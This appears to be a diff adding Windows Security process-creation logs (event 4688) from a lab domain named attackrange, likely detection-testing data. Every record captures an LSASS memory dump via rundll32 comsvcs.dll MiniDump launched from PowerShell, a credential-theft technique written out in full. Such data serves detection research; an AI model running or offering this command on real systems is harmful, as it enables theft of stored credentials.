@@ -1,0 +1,164 @@
+03/23/2021 01:40:45 PM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-dc-811.attackrange.local
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=258296
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		ATTACKRANGE\Administrator
+	Account Name:		Administrator
+	Account Domain:		ATTACKRANGE
+	Logon ID:		0x48AE56
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x584
+	New Process Name:	C:\Windows\System32\rundll32.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0xdb4
+	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Process Command Line:	"C:\Windows\System32\rundll32.exe" C:\windows\System32\comsvcs.dll MiniDump 840 C:\Users\ADMINI~1\AppData\Local\Temp\lsass-comsvcs.dmp full
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
+03/23/2021 01:40:45 PM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-dc-811.attackrange.local
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=258294
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		ATTACKRANGE\Administrator
+	Account Name:		Administrator
+	Account Domain:		ATTACKRANGE
+	Logon ID:		0x48AE56
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0xdb4
+	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x3a8
+	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Process Command Line:	"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" & {C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\lsass-comsvcs.dmp full} 
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
+03/23/2021 01:32:54 PM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-dc-811.attackrange.local
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=257146
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		ATTACKRANGE\Administrator
+	Account Name:		Administrator
+	Account Domain:		ATTACKRANGE
+	Logon ID:		0x395391
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0xc70
+	New Process Name:	C:\Windows\System32\rundll32.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x107c
+	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Process Command Line:	"C:\Windows\System32\rundll32.exe" C:\windows\System32\comsvcs.dll MiniDump 840 C:\Users\ADMINI~1\AppData\Local\Temp\lsass-comsvcs.dmp full
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
+03/23/2021 01:32:54 PM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-dc-811.attackrange.local
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=257145
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		ATTACKRANGE\Administrator
+	Account Name:		Administrator
+	Account Domain:		ATTACKRANGE
+	Logon ID:		0x395391
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x107c
+	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0xa10
+	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Process Command Line:	"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" & {C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\lsass-comsvcs.dmp full} 
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
